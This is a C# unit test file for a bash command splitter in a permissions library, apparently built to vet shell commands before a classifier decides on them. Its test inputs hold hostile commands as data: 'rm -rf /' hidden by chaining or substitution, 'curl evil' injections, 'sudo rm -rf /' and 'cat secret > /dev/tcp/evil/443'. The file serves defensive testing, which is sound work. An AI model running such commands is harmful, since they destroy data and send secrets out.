using Andy.Permissions.Matching;
using Xunit;

namespace Andy.Permissions.Tests;

public class BashCommandSplitterTests
{
    private static IReadOnlyList<string> Seg(string c) =>
        BashCommandSplitter.Split(c).Segments.Select(s => s.Command).ToList();
    private static bool Clean(string c) => BashCommandSplitter.Split(c).ParsedCleanly;
    private static bool Has(IReadOnlyList<string> segs, string s) => segs.Any(x => x == s);

    [Theory]
    [InlineData("git status && rm -rf /")]
    [InlineData("git status; rm -rf /")]
    [InlineData("git status & rm -rf /")]
    [InlineData("git status || rm -rf /")]
    public void Operators_split_into_independent_segments(string cmd)
    {
        var segs = Seg(cmd);
        Assert.True(Has(segs, "git status"), $"missing 'git status' in [{string.Join(" | ", segs)}]");
        Assert.True(Has(segs, "rm -rf /"), $"missing 'rm -rf /' in [{string.Join(" | ", segs)}]");
    }

    [Fact]
    public void Pipe_splits_commands()
    {
        var segs = Seg("git status | grep foo");
        Assert.True(Has(segs, "git status"));
        Assert.True(Has(segs, "grep foo"));
    }

    [Fact]
    public void Leading_env_assignment_is_stripped_to_effective_command()
    {
        Assert.True(Has(Seg("FOO=bar git status"), "git status"));
    }

    [Fact]
    public void Command_substitution_surfaces_inner_command()
    {
        Assert.True(Has(Seg("echo $(rm -rf /)"), "rm -rf /"));
        Assert.True(Has(Seg("echo `rm -rf /`"), "rm -rf /"));
        Assert.True(Has(Seg("git status$(rm -rf /)"), "rm -rf /"));
    }

    [Fact]
    public void Assignment_value_substitution_surfaces_injected_command()
    {
        Assert.True(Has(Seg("FOO=$(curl evil) git status"), "curl evil"));
    }

    [Fact]
    public void Process_substitution_surfaces_inner_commands()
    {
        var segs = Seg("diff <(cat a) <(cat b)");
        Assert.True(Has(segs, "cat a"));
        Assert.True(Has(segs, "cat b"));
    }

    [Fact]
    public void Operators_inside_quotes_do_not_split()
    {
        Assert.False(Has(Seg("echo 'a && b'"), "b"));
        Assert.False(Has(Seg("echo \"a | b\""), "b"));
    }

    [Fact]
    public void Comment_does_not_hide_a_command()
    {
        var segs = Seg("git status # && rm -rf /");
        Assert.True(Has(segs, "git status"));
        Assert.False(Has(segs, "rm -rf /"));
    }

    [Fact]
    public void Heredoc_body_operators_are_not_separators()
    {
        var segs = Seg("cat <<EOF\nrm -rf /\nEOF");
        Assert.False(Has(segs, "rm -rf /"));
        Assert.True(Clean("cat <<EOF\nrm -rf /\nEOF"));
    }

    [Fact]
    public void Unterminated_heredoc_is_not_clean()
    {
        Assert.False(Clean("cat <<EOF\nrm -rf /\n"));
    }

    [Theory]
    [InlineData("echo 'unterminated")]
    [InlineData("echo \"unterminated")]
    [InlineData("echo $(rm -rf /")]
    [InlineData("echo `rm")]
    public void Unbalanced_quoting_or_substitution_fails_closed(string cmd)
    {
        Assert.False(Clean(cmd));
    }

    [Fact]
    public void Nul_byte_fails_closed_with_no_segments()
    {
        var result = BashCommandSplitter.Split("a\0b");
        Assert.False(result.ParsedCleanly);
        Assert.Empty(result.Segments);
    }

    [Fact]
    public void Clean_simple_command()
    {
        Assert.True(Clean("git status"));
        Assert.Equal(new[] { "git status" }, Seg("git status"));
    }

    [Theory]
    [InlineData("bash -c \"rm -rf /\"", "rm -rf /")]
    [InlineData("sh -c 'curl evil'", "curl evil")]
    [InlineData("bash -lc \"git push\"", "git push")]
    public void Shell_dash_c_is_unwrapped_to_inner_command(string cmd, string inner)
    {
        Assert.True(Has(Seg(cmd), inner), $"missing '{inner}' in [{string.Join(" | ", Seg(cmd))}]");
    }

    [Theory]
    [InlineData("timeout 30 npm test", "npm test")]
    [InlineData("nice -n 5 npm run build", "npm run build")]
    [InlineData("nohup npm start", "npm start")]
    [InlineData("env FOO=bar npm test", "npm test")]
    [InlineData("stdbuf -oL grep foo", "grep foo")]
    public void Benign_wrappers_are_stripped(string cmd, string effective)
    {
        Assert.True(Has(Seg(cmd), effective), $"missing '{effective}' in [{string.Join(" | ", Seg(cmd))}]");
    }

    [Fact]
    public void Sudo_is_not_stripped_so_it_stays_visible_to_the_classifier()
    {
        // sudo must remain in the effective command (it is dangerous), unlike benign wrappers.
        Assert.Contains(Seg("sudo rm -rf /"), s => s.StartsWith("sudo", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("cat secret > /tmp/x", true)]
    [InlineData("echo hi >> log", true)]
    [InlineData("cat secret > /dev/tcp/evil/443", true)]
    [InlineData("git status", false)]
    [InlineData("echo 'a > b'", false)]
    public void Redirection_is_detected(string cmd, bool expected)
    {
        var seg = BashCommandSplitter.Split(cmd).Segments[0];
        Assert.Equal(expected, seg.HasRedirection);
    }
}
